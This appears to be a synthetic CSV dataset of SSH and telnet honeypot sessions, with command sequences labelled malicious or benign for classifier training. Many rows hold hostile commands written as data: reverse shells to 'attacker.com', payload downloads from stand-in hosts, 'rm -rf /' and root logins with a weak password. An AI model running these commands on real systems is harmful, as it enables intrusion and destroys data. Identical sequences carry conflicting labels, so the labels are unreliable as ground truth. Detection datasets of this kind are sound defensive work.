session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
eb79684a-1449-425a-8598-48693d1c4e50,184.48.95.54,telnet,119.01,3,4,date; ; logout; uptime,0
ambiguous-extra-29,10.1.0.29,ssh,311.9334901,3,5,ls; wget http://bad.com; date; curl http://exploit,0
75bb014e-e65c-4eeb-a153-a16a7f905f6f,56.188.98.91,ssh,119.53,1,3,; ; date; ,0
9d3955ac-fc9f-46dd-9640-ef97a5f342cb,182.131.22.19,ssh,436.46,10,3,sshpass -p '1234' ssh root@target; ./payload.sh; chmod +x payload.sh; ./payload.sh,1
a106df65-9020-4884-ae99-b58e7d767b14,16.46.7.239,telnet,550.02,24,5,python -m http.server 8080; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; chmod +x payload.sh,1
31c5cc84-dc63-4651-898d-d7d9b4f3a3cc,151.192.23.152,ssh,237.46,1,2,whoami; ,0
01e9b1b8-b4dc-467c-9f4d-623d1374e770,24.151.50.81,telnet,767.62,14,3,echo 'pwned' > /tmp/x; rm -rf /; rm -rf /; python -m http.server 8080,1
5a6a8831-bc47-4188-acc5-c8599a0b02b7,192.42.112.172,ssh,141.27,4,4,ls; ; cd /home; exit,0
2ee31730-c7c5-4a44-aca6-2f620fd2f7b2,212.183.109.236,ssh,278.02,5,3,ls; whoami; curl -O http://badhost/file,1
0da8a676-97a9-4069-b138-3142991e3331,109.68.222.129,telnet,131.13,4,4,date; cd /home; whoami; ,0
6c3d7f7d-4b02-49cb-8184-17c9eaab879d,91.207.118.198,ssh,592.39,14,4,python -m http.server 8080; wget http://malicious.site/payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x,1
8f7c984c-790f-4cb2-8859-7e0c57f25cc7,111.197.171.161,ssh,152.58,1,2,; exit,0
b3c6d41e-0f22-454f-8397-b59ca862d4ff,196.8.76.157,ssh,336.73,20,5,rm -rf /; ./payload.sh; chmod +x payload.sh; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; ./payload.sh; chmod +x payload.sh,1
10072269-91c4-442a-bac9-9affbfbc45b2,68.88.168.63,ssh,132.87,3,3,ls; ; cd /home,0
d6aa8d0f-62db-48f0-b8f5-6e8674bebf35,79.254.47.122,ssh,529,15,4,python -m http.server 8080; rm -rf /; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target,1
idle-extra-27,192.168.100.27,ssh,524.9430889,0,0,,0
68daa097-4de5-4e0f-92e2-737c77f6619c,181.123.233.127,ssh,122.45,27,6,echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target,1
3e0edc8b-fe9b-4d09-a497-35a281f799c2,108.124.216.1,ssh,89.31,2,2,uptime; whoami,0
3237e032-82e4-40dd-a143-fc79cec809be,75.67.81.163,ssh,373.07,23,5,nc -e /bin/sh attacker.com 4444; rm -rf /; rm -rf /; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; python -m http.server 8080,1
c3930aac-d07a-4924-b0ee-eea5ef2d9ec0,188.206.46.52,ssh,731.76,18,5,python -m http.server 8080; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; python -m http.server 8080,1
92b2e396-9df1-417a-87f0-e82f3456ddd5,174.214.211.221,telnet,14.94,3,3,whoami; ; ; cd /home,0
01d4aa74-a0a9-4bdc-bf63-0d68415c60ce,250.15.231.205,ssh,93.8,3,3,uptime; ls; logout,0
bab6fd98-aa01-43ef-84b6-8badc0d1e648,236.208.67.109,ssh,27.88,15,5,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; rm -rf /,1
96a15c67-1e0d-4e99-bfa6-dcf3178ad173,55.92.146.108,telnet,788.57,21,5,rm -rf /; echo 'pwned' > /tmp/x; ./payload.sh; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh,1
10c852e0-7cf3-46ce-83aa-1056297a0e29,104.176.254.117,telnet,109.87,2,3,ls; ; logout,0
c729135f-fcf6-4e81-b483-53285f781710,47.107.131.198,telnet,232.03,1,2,logout; ,0
9918f212-8fbe-494f-b8a0-6e3585505e4c,198.21.185.10,ssh,94.79,1,2,pwd; ; ,0
f020c0a4-73f1-4b54-aa35-02a52f14f46f,154.177.36.230,ssh,286.26,2,2,uptime; pwd,0
48cb303c-07a0-4ebf-86d6-d95a855a693c,63.198.69.83,ssh,36.16,3,3,; logout; date; date,0
669480c1-0b2a-40bc-aff9-1bf94b9c8ea2,80.174.163.4,ssh,764.4,13,3,./payload.sh; python -m http.server 8080; python -m http.server 8080; echo 'pwned' > /tmp/x,1
b476132e-e3e8-4d77-83cf-ce4990823e37,129.120.108.35,ssh,14.26,2,3,; exit; ls,0
32267019-1444-4e2c-be87-a6da72e24f79,38.135.200.174,ssh,49.94,5,3,date; logout; nc attacker.com 4444,0
abf0f085-cf8a-49e5-a184-658ae5e12b02,253.210.120.83,ssh,144.99,2,3,; logout; uptime,0
703d211b-c9a5-46fd-b161-ccc93c80114d,75.152.196.233,ssh,442.6,14,5,./payload.sh; ./payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit,1
322e4e2d-c4f5-4b32-8fc1-0b539d0d0c11,115.213.211.32,ssh,217.53,3,3,pwd; ls; uptime,0
f2d62874-6f20-40a9-8e67-0b36840a2d3f,244.47.42.22,ssh,176.26,3,4,logout; logout; ; uptime,0
7cf26903-482d-425a-aa3c-368a56d11cc0,196.218.159.6,telnet,665.63,13,5,./payload.sh; scp exploit.sh root@target:/tmp/; rm -rf /; ./payload.sh; sshpass -p '1234' ssh root@target,1
09039df1-1b53-43da-a091-7898d9a4e205,163.169.91.81,ssh,835.6,15,4,python -m http.server 8080; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; curl -O http://badhost/exploit,1
f0346df5-d168-4cdf-b659-9a1a0e099b1d,61.72.89.250,ssh,156.45,3,3,whoami; exit; ls,0
ambiguous-extra-53,10.1.0.53,telnet,189.2364483,2,6,exit; chmod +x payload.sh; date; cd /,0
3374432d-68cb-43a4-934e-a7ef44bce7a1,89.161.102.86,ssh,218.77,1,2,ls; ; ,0
c768d33c-a4f6-4c52-a31b-f4b98a3f99da,118.101.227.146,ssh,454.54,14,3,echo 'pwned' > /tmp/x; python -m http.server 8080; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/,1
ambiguous-extra-129,10.1.0.129,telnet,34.15591506,6,2,exit; wget http://bad.com; pwd; curl http://exploit; ls,0
999e1c50-8cf1-4b52-b2f1-1aa79034b94b,183.180.62.215,ssh,170.46,4,2,; cd /home; cd /home,0
87cae6b0-67e0-4626-9463-71ad27dc5940,240.129.88.211,ssh,200.52,3,3,cd /home; ; date; ,0
e8c90d28-6c05-4cb9-819a-b3603c9e2cb1,156.97.196.30,ssh,169.14,15,4,nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; rm -rf /; curl -O http://badhost/exploit,1
d8e05199-3e38-45cc-ac95-6ab6c624ede6,142.235.229.149,telnet,66.02,0,2,; ; ,0
455c3326-daea-4315-a136-22a32b2eca4c,243.66.106.179,ssh,90.68,4,4,pwd; logout; date; ls,0
6c763d04-e96f-4fef-84ed-09c93b3ae3c6,109.87.27.180,ssh,65.89,5,3,pwd; echo test; wget http://suspicious.site/x,0
e07e325e-00c2-4016-b743-7b8a8937ada8,196.108.211.188,ssh,282.78,1,2,; ls,0
5b9dffdd-8079-45db-a94d-95c387f2cea0,109.152.11.29,ssh,812.18,18,5,nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/,1
cfcb3f4b-b9b8-42c7-a9bf-01245b740ca0,177.219.44.161,ssh,55.99,13,4,sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; chmod +x payload.sh; scp exploit.sh root@target:/tmp/,1
8da8aa86-34ea-416f-94f4-5ca5f9d0f0a7,240.122.109.229,ssh,156.34,1,3,; exit; ,0
41751a54-173d-4381-bf13-c2f10450c8d4,178.136.251.78,telnet,235.62,1,3,; ; uptime; ,0
15f310cd-d5b1-4367-b648-c97537eef7e6,90.76.148.81,ssh,91.16,9,3,./payload.sh; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; python -m http.server 8080,1
a7774854-796d-4f55-a45e-e07736e990b1,38.175.77.241,ssh,98.4,22,5,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; python -m http.server 8080; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444,1
9a1c822a-7f32-4864-a535-0b4d07f02cb4,50.163.199.46,ssh,704.48,12,4,python -m http.server 8080; chmod +x payload.sh; python -m http.server 8080; ./payload.sh,1
f419ccfd-57dd-405c-908a-917ee95040dd,103.116.143.39,ssh,373.31,20,4,chmod +x payload.sh; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target,1
2891bd81-1cc6-436c-812f-15a226665f11,185.94.187.100,ssh,254.4,3,4,; date; exit; logout,0
9745a658-9db7-4e73-bc08-8ebd9170a17c,152.93.196.139,telnet,108.28,3,2,ls; uptime; uptime,0
9ef8da75-2c64-4c2c-a7f6-b884e8b75f47,176.139.130.9,ssh,128.6,2,2,exit; pwd,0
02597c29-f69b-47c0-888a-f6d5e0008360,194.149.223.227,ssh,196.32,5,3,exit; pwd; pwd; cd /home,0
9741e27e-aa5d-4eb4-8818-a16549c0d08d,214.129.71.35,ssh,154.82,2,2,ls; whoami,0
a41c9f7e-f3d6-4666-af8b-94c8a5f1869b,115.16.177.159,ssh,598.21,13,4,python -m http.server 8080; ./payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x,1
8caf49a0-c0da-4361-b7af-822a9c1e1b0a,9.80.35.6,ssh,720.89,27,5,python -m http.server 8080; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh,1
08353c0e-eb53-4e36-b47a-96b26bcb3774,236.132.190.169,ssh,395.75,24,6,wget http://malicious.site/payload.sh; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; chmod +x payload.sh; rm -rf /,1
20809e42-d1cb-452b-b038-db9cdcd4a24e,113.192.169.231,ssh,543.8,5,3,date; logout; nc attacker.com 4444,1
a9a38f55-a0de-4e0e-98ef-4d80f90a57db,58.100.179.179,ssh,800.94,10,4,scp exploit.sh root@target:/tmp/; ./payload.sh; chmod +x payload.sh; rm -rf /,1
446ca7b2-2c1f-45c9-91ae-f3d9a5a64882,230.60.200.41,ssh,460.4,18,4,chmod +x payload.sh; sshpass -p '1234' ssh root@target; rm -rf /; echo 'pwned' > /tmp/x; rm -rf /,1
f4c97936-9ea2-4c1f-8ef7-f9c8269cd97e,201.208.35.161,telnet,51.35,7,3,wget http://malicious.site/payload.sh; ./payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/,1
ambiguous-extra-104,10.1.0.104,telnet,26.07137068,10,5,curl http://exploit; cd /,1
d4b719d1-b06a-4255-8f73-d0b0124d76ee,118.34.89.37,ssh,147.52,5,3,ls; whoami; curl -O http://badhost/file,0
c25e634b-5673-4b42-8b29-e0d5d59515b6,76.96.255.231,ssh,94.85,3,3,logout; ; pwd; pwd,0
219d0209-62b0-4fd3-960f-7e4df632fdf4,125.7.93.188,telnet,498.64,15,4,wget http://malicious.site/payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; chmod +x payload.sh; wget http://malicious.site/payload.sh,1
d63a09b5-dd1f-4c25-968c-c166f8318f71,79.50.14.254,ssh,215.04,2,2,uptime; whoami,0
59b84ec0-fc54-4a77-ad30-e26e1651871e,239.218.133.90,ssh,210.34,2,3,date; date; ; ,0
cc46fab3-bee9-419f-88c5-ea3afc2d8412,62.90.216.122,ssh,468.28,22,6,sshpass -p '1234' ssh root@target; ./payload.sh; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; ./payload.sh; curl -O http://badhost/exploit; python -m http.server 8080,1
80172480-22ff-49d5-9467-6da1dd771aae,40.131.166.10,ssh,107.53,2,3,; pwd; pwd; ,0
8107ab58-3923-4ac6-b302-018fb3e57505,236.78.86.81,ssh,94.49,3,3,uptime; pwd; whoami,0
09370e0f-c5e4-4662-b915-7e05722a3ba7,195.78.182.198,ssh,276.3,3,3,cd /home; date; ,0
ambiguous-28,10.0.0.28,ssh,113.2527056,12,3,curl http://exploit; date,1
b33bc0df-e4f9-4a91-b055-814bea308c5f,39.93.108.109,ssh,143.07,3,3,ls; ls; ls; ,0
3fd81da3-5f8f-4682-a474-e1a129fbc0d8,11.15.166.148,ssh,233.64,2,3,exit; ; ; uptime,0
ambiguous-extra-116,10.1.0.116,ssh,33.66319574,16,6,exit; curl http://exploit; pwd,0
58a802b3-c9e9-451a-8fdb-e350f1cf2763,69.134.30.174,telnet,232.58,2,3,exit; uptime; ,0
scan-19,172.16.0.19,telnet,0,0,0,,0
702c0ad7-fb75-46e9-8daa-ffe82a8e00ab,249.151.123.229,ssh,795.69,18,5,sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; rm -rf /; curl -O http://badhost/exploit; ./payload.sh; chmod +x payload.sh,1
49fb7ee8-dad6-4344-8525-d10f8d366bf8,254.120.103.140,ssh,333.59,22,5,rm -rf /; rm -rf /; python -m http.server 8080; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; python -m http.server 8080,1
dd0ace30-dde5-4496-9bd1-47f72bebcdef,254.162.128.219,telnet,225.18,2,2,; cd /home,0
5a99d0e4-05da-489b-8897-a8b12c65d060,105.53.66.113,ssh,702.84,21,6,nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; rm -rf /; ./payload.sh,1
62be8057-e38b-4886-8433-a71dc6202e71,16.128.211.167,ssh,672.47,21,5,python -m http.server 8080; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; ./payload.sh,1
3a92983b-adc0-4a7d-9da4-694eb639cb01,194.90.206.115,ssh,148.17,3,3,ls; ls; exit,0
405f7609-e50a-446c-a421-e6a105056ab6,60.241.53.183,ssh,198.7,5,3,pwd; pwd; cd /home; pwd,0
ambiguous-extra-42,10.1.0.42,ssh,52.0094021,19,6,curl http://exploit; whoami; nc -e /bin/sh attacker.com,0
d7b88347-b10f-400b-9029-27a324354e9e,171.193.19.37,ssh,49.34,1,2,pwd; ,0
8c4282a4-60da-4120-9f85-12453ccda194,90.2.88.49,ssh,344.91,11,4,wget http://malicious.site/payload.sh; ./payload.sh; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh,1
f2376dc3-a545-4b67-99fb-3541cb70b38a,183.212.201.149,ssh,152.27,1,2,; uptime,0
92858120-57db-4055-a9fd-fdcd926470f7,172.238.218.142,telnet,77.35,3,2,cd /home; ls,0
30655989-f784-4493-b8e8-b84478a2776a,226.19.215.68,ssh,65.42,2,3,; whoami; pwd,0
07798f45-4176-4abc-b7ba-41093a09e378,4.5.24.246,ssh,17.17,0,2,; ,0
c6aebecc-a0b2-4e9a-af5a-5a4967d5f6e4,195.250.249.55,ssh,109.98,4,4,cd /home; ls; exit; ,0
b66c2be6-8a0b-46e6-bda2-b01c9330aaba,244.34.227.21,telnet,150.4,2,2,cd /home; ,0
b55e3f59-62fa-41d1-88ed-3b8cad222b83,145.178.157.233,telnet,278.74,20,4,echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit,1
669025f0-c430-441e-b3e3-c3d3444ea23b,201.187.158.47,ssh,30.26,1,2,date; ; ,0
014b783a-92ae-4255-b446-49178613c530,117.248.113.238,ssh,262.07,4,3,uptime; exit; cd /home,0
f92daa8a-6a82-4b50-8254-037621bcd083,202.196.85.220,ssh,194.03,2,4,; ; date; whoami,0
ambiguous-extra-117,10.1.0.117,telnet,340.1590407,13,5,curl http://exploit; cd /; nc -e /bin/sh attacker.com; pwd; date,1
idle-11,192.168.1.11,ssh,741.6353523,0,0,,0
a2dd3bba-e670-4515-a68d-a284ac209ed8,234.73.8.216,ssh,190,5,3,date; logout; nc attacker.com 4444,0
idle-extra-12,192.168.100.12,telnet,544.5995263,0,0,,0
511f6725-03ed-41b4-9d28-dfd824f35860,69.76.243.1,ssh,259.71,0,2,; ; ,0
c56c2ebe-f620-427d-a560-82cc7545e761,249.210.184.201,ssh,135.04,22,4,echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
a6d859df-ac1d-4691-8402-d36ee451bf3b,3.223.68.57,ssh,61.14,17,5,chmod +x payload.sh; sshpass -p '1234' ssh root@target; python -m http.server 8080; ./payload.sh; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh,1
e50353a3-1739-4ff5-80d5-c8ccf94d0ecf,151.219.238.102,ssh,271.89,4,3,whoami; exit; exit; whoami,0
5b18cc79-db51-42db-85c0-bfda19817833,238.63.215.64,ssh,527.31,5,3,ls; whoami; curl -O http://badhost/file,1
3154af43-14b8-4013-8f26-bde816349d83,110.129.67.86,ssh,739.12,13,4,curl -O http://badhost/exploit; curl -O http://badhost/exploit; chmod +x payload.sh; ./payload.sh; chmod +x payload.sh,1
864fef53-2585-4a73-b0a4-9f7d0b266972,36.181.231.163,ssh,307.81,21,5,./payload.sh; rm -rf /; wget http://malicious.site/payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x; python -m http.server 8080; rm -rf /,1
ambiguous-extra-130,10.1.0.130,ssh,190.4799584,3,1,curl http://exploit; whoami; ls; exit,0
c401e099-390b-4dcf-a081-bda1922d2ba3,90.191.30.153,ssh,124.11,5,3,date; logout; nc attacker.com 4444,0
b33db482-8e7d-4222-8c0c-578a0cff7cd6,195.86.72.66,ssh,184.06,13,4,chmod +x payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444,1
2f0931d4-c9c9-46f1-94f1-11b6bbbdf04d,134.47.54.73,ssh,603.13,23,6,python -m http.server 8080; sshpass -p '1234' ssh root@target; ./payload.sh; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; chmod +x payload.sh,1
09f23c0b-98e8-4b36-911c-85943b6d0809,108.101.176.140,telnet,250.16,25,6,rm -rf /; python -m http.server 8080; chmod +x payload.sh; wget http://malicious.site/payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
ambiguous-extra-21,10.1.0.21,ssh,339.171584,3,4,cd /; exit; chmod +x payload.sh; wget http://bad.com,0
idle-extra-33,192.168.100.33,ssh,1005.016007,0,0,,0
74f2c693-02ac-423c-9bd9-2440e148ad80,119.6.58.223,ssh,71.77,3,3,uptime; uptime; exit,0
0d6c1334-f71b-4b9a-9c48-7786bd9bbb32,175.9.50.204,telnet,556.08,21,6,chmod +x payload.sh; chmod +x payload.sh; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; ./payload.sh; sshpass -p '1234' ssh root@target,1
daf1fc26-8e9a-44fa-8f52-1bf00ca1dd0f,81.220.223.21,ssh,40.13,2,3,date; ls; ; ,0
63554fd4-3ff2-4d15-bc88-d3dd441c5366,220.175.83.240,ssh,124.65,3,3,pwd; date; ls,0
95a1db60-71cc-43aa-bf8c-264c7dfff075,203.82.234.202,ssh,113.71,0,2,; ,0
dee7078a-844f-4e64-93c3-6f3bddd261be,75.159.104.43,ssh,110.83,5,3,date; logout; nc attacker.com 4444,0
da750755-78a8-4172-8f5b-e637200b7cd9,32.49.27.122,ssh,107.68,25,7,sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; ./payload.sh; wget http://malicious.site/payload.sh; python -m http.server 8080,1
da6f1e6e-6929-4bb6-be60-f9202885133b,154.42.174.73,ssh,16.23,1,3,; ; date,0
fa36cb7c-1414-4d19-9999-822b482b32bb,90.215.42.224,ssh,287.59,1,2,; pwd,0
d651125c-b043-4e93-a00e-e1c7660d5d0c,184.238.186.98,telnet,133.09,4,4,cd /home; ; date; logout,0
3b2d9f71-65bd-4c85-81fe-28c897bc7185,78.136.52.86,ssh,184.79,1,3,; ; ; exit,0
ambiguous-3,10.0.0.3,telnet,182.8348121,9,2,date; pwd; chmod +x payload.sh; wget http://bad.com,0
ac980562-eb47-4c86-b900-7fe02fc0db4f,141.220.114.84,telnet,37.76,19,6,./payload.sh; rm -rf /; echo 'pwned' > /tmp/x; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
8d2e7bb5-b28b-4be9-82f2-bee39ef595ed,200.210.113.10,ssh,881.59,15,4,echo 'pwned' > /tmp/x; chmod +x payload.sh; rm -rf /; nc -e /bin/sh attacker.com 4444,1
b7278471-9f4b-436b-be53-483c746526d4,17.56.247.230,ssh,293.7,23,6,sshpass -p '1234' ssh root@target; rm -rf /; ./payload.sh; rm -rf /; chmod +x payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x,1
f6febcc2-b354-4203-aa3e-d56f6af9ec6c,170.80.80.253,ssh,237.44,1,2,; exit,0
4cefa727-496e-4607-ba28-3623cf1efd91,205.151.224.77,ssh,140.56,15,6,./payload.sh; ./payload.sh; wget http://malicious.site/payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; rm -rf /; python -m http.server 8080,1
a4c5da6f-f3a1-4559-99a8-10c8916e7890,65.230.122.193,ssh,313.48,18,6,scp exploit.sh root@target:/tmp/; rm -rf /; ./payload.sh; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; python -m http.server 8080; ./payload.sh,1
scan-extra-11,172.20.0.11,telnet,0,0,0,,0
be126ae3-0d07-4210-bc09-0365c8b5c0b4,123.178.156.123,ssh,6.09,17,5,wget http://malicious.site/payload.sh; chmod +x payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
a0730a65-8733-4da4-b81e-9ba0190b9343,225.111.226.7,ssh,328.63,5,3,ls; whoami; curl -O http://badhost/file,1
14202e90-7f13-4029-98e9-b44cd5e78c1f,161.133.90.125,ssh,108.38,2,3,date; ; ; whoami,0
4bc3e189-64db-4da0-b3c0-22993784b3e6,150.164.41.18,telnet,860.01,5,3,date; logout; nc attacker.com 4444,1
2cea0629-e66c-430e-afe2-4ab984149525,149.55.35.17,ssh,786,13,5,wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; ./payload.sh; rm -rf /; sshpass -p '1234' ssh root@target,1
c7e0f22d-9730-462e-967d-85b680890ac9,82.31.130.147,ssh,749.72,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
scan-extra-42,172.20.0.42,telnet,0,0,0,,0
ambiguous-48,10.0.0.48,telnet,240.2770442,3,2,wget http://bad.com; date; exit; whoami; chmod +x payload.sh,0
b6b9085c-c74e-4b8a-a34d-c9d0811c2b2b,1.171.234.2,telnet,267.46,1,2,pwd; ,0
48381937-92da-4c14-ba71-0da6c806f732,24.5.118.134,telnet,174.63,2,4,; exit; whoami; ,0
8bfbb10b-977f-4aa5-969b-c66ff16a8ff0,63.235.16.178,telnet,7.66,22,6,chmod +x payload.sh; rm -rf /; chmod +x payload.sh; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; rm -rf /; ./payload.sh,1
3a42bfdb-53e3-44b4-b624-61aeb5fe7296,170.41.238.26,ssh,316.73,16,5,wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; rm -rf /; nc -e /bin/sh attacker.com 4444,1
fb535d32-ac27-4746-855c-53fa87185dfa,10.59.125.161,ssh,484.63,23,6,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; chmod +x payload.sh; sshpass -p '1234' ssh root@target,1
ambiguous-extra-40,10.1.0.40,telnet,144.3199141,18,7,nc -e /bin/sh attacker.com; curl http://exploit; exit,0
4b56d76e-e33e-414b-b558-71cb422b9355,72.119.203.108,ssh,125.97,1,3,; whoami; ,0
881d2247-f405-403d-bf8f-60b409c6ab61,98.58.180.219,ssh,61.55,4,4,uptime; ls; ; cd /home,0
3d17d64f-fb0f-40fe-902d-c7c84390a4be,193.127.9.4,ssh,77.09,1,2,; exit,0
957633eb-0afc-4f8b-9912-83339aa484ad,83.31.86.152,ssh,71.74,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
c328fa1e-dbff-4df7-8a60-97b2a2649558,244.83.208.34,ssh,707.95,5,3,date; logout; nc attacker.com 4444,1
d8f5a83c-4ed9-4200-a25a-ca11218e4194,108.163.173.58,ssh,673.63,11,4,wget http://malicious.site/payload.sh; rm -rf /; ./payload.sh; sshpass -p '1234' ssh root@target,1
0bd08251-4b3c-4c24-8df9-af1101d1a294,187.112.68.102,ssh,458.32,20,5,scp exploit.sh root@target:/tmp/; rm -rf /; rm -rf /; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh,1
148d2874-64a7-4ac3-8370-57c823f8ffce,215.154.254.171,ssh,86.86,4,4,; exit; whoami; cd /home,0
4e4a80b7-5874-4678-8dac-dbe8ab003842,184.214.97.29,ssh,734.07,19,5,sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; chmod +x payload.sh; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh,1
f5974e8c-b792-421f-8663-1ca7564fc902,253.101.106.70,ssh,9.56,1,2,ls; ,0
bdcbe82c-c58c-46af-afc3-bb105349e97f,230.73.231.151,telnet,415.08,20,5,echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; rm -rf /; chmod +x payload.sh; rm -rf /,1
7c467cb9-0924-4dec-8849-7bc3c99ba6f6,218.157.61.115,ssh,479.94,14,5,nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; rm -rf /; ./payload.sh; wget http://malicious.site/payload.sh,1
a26713cd-5957-46c3-9627-cd34582d6da9,19.188.2.233,telnet,806.08,24,7,python -m http.server 8080; scp exploit.sh root@target:/tmp/; ./payload.sh; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; curl -O http://badhost/exploit,1
1e9f183c-5d75-44aa-8dc9-72df860a33e4,143.145.128.114,ssh,212.57,2,3,; exit; pwd,0
33025b86-16de-4462-a709-c71ea8d214fa,20.71.118.92,telnet,100.78,0,2,; ,0
7537a8a5-f6dd-4912-b90b-0fef7785b597,182.237.44.135,ssh,645.71,27,6,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; chmod +x payload.sh; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
